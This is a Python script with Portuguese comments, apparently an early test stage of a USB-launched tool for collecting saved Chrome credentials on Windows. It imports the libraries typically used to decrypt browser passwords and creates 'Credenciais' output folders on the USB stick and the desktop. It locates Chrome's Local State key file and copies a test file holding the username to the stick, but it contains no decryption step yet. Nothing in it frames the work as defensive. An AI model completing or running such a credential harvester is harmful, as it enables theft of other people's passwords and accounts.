import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import subprocess
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime

# =============================================
# LOG FORÇADO NA ÁREA DE TRABALHO (SEMPRE FUNCIONA)
# =============================================
DESKTOP = os.path.join(os.environ['USERPROFILE'], 'Desktop')
LOG_GLOBAL = os.path.join(DESKTOP, 'coletor_log.txt')

def log_global(texto):
    with open(LOG_GLOBAL, 'a', encoding='utf-8') as f:
        f.write(str(texto) + '\n')

log_global("="*50)
log_global("INICIANDO PROGRAMA")
log_global(f"Hora: {datetime.now().strftime('%H:%M:%S')}")

# =============================================
# CONFIGURAÇÕES - TENTA CRIAR PASTA NO PENDRIVE E NA ÁREA DE TRABALHO
# =============================================
USUARIO = os.getlogin()
PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
log_global(f"Pasta atual: {PASTA_ATUAL}")

# Tenta criar no pendrive
PASTA_SAIDA_PENDRIVE = os.path.join(PASTA_ATUAL, "Credenciais")
try:
    os.makedirs(PASTA_SAIDA_PENDRIVE, exist_ok=True)
    log_global(f"Pasta criada no pendrive: {PASTA_SAIDA_PENDRIVE}")
except Exception as e:
    log_global(f"ERRO ao criar pasta no pendrive: {e}")

# SEMPRE cria uma cópia na Área de Trabalho (garantido)
PASTA_SAIDA_DESKTOP = os.path.join(DESKTOP, "Credenciais_Coletor")
os.makedirs(PASTA_SAIDA_DESKTOP, exist_ok=True)
log_global(f"Pasta criada na Área de Trabalho: {PASTA_SAIDA_DESKTOP}")

# =============================================
# FUNÇÕES DE COLETA (SIMPLIFICADAS PARA TESTE)
# =============================================
try:
    log_global("Tentando acessar o Chrome...")
    chrome_path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Local State"
    
    if not os.path.exists(chrome_path):
        log_global("ERRO: Chrome não encontrado!")
        with open(os.path.join(PASTA_SAIDA_DESKTOP, "chrome_nao_encontrado.txt"), "w") as f:
            f.write("Chrome não está instalado.")
    else:
        log_global("Chrome encontrado!")
        
        # Cria um arquivo de teste na Área de Trabalho
        with open(os.path.join(PASTA_SAIDA_DESKTOP, "teste.txt"), "w") as f:
            f.write("O programa rodou com sucesso!\n")
            f.write(f"Usuário: {USUARIO}\n")
            f.write(f"Data: {datetime.now()}\n")
        
        # Tenta copiar para o pendrive também
        try:
            shutil.copy(
                os.path.join(PASTA_SAIDA_DESKTOP, "teste.txt"),
                os.path.join(PASTA_SAIDA_PENDRIVE, "teste.txt")
            )
            log_global("Arquivo copiado para o pendrive com sucesso!")
        except Exception as e:
            log_global(f"ERRO ao copiar para o pendrive: {e}")
        
        log_global("PROGRAMA FINALIZADO COM SUCESSO!")

except Exception as e:
    log_global(f"ERRO GERAL: {e}")
    import traceback
    log_global(traceback.format_exc())

# =============================================
# FIM - GARANTE QUE O PROGRAMA NÃO FECHE RÁPIDO DEMAIS
# =============================================
log_global("FIM - Aguardando 5 segundos...")
time.sleep(5)
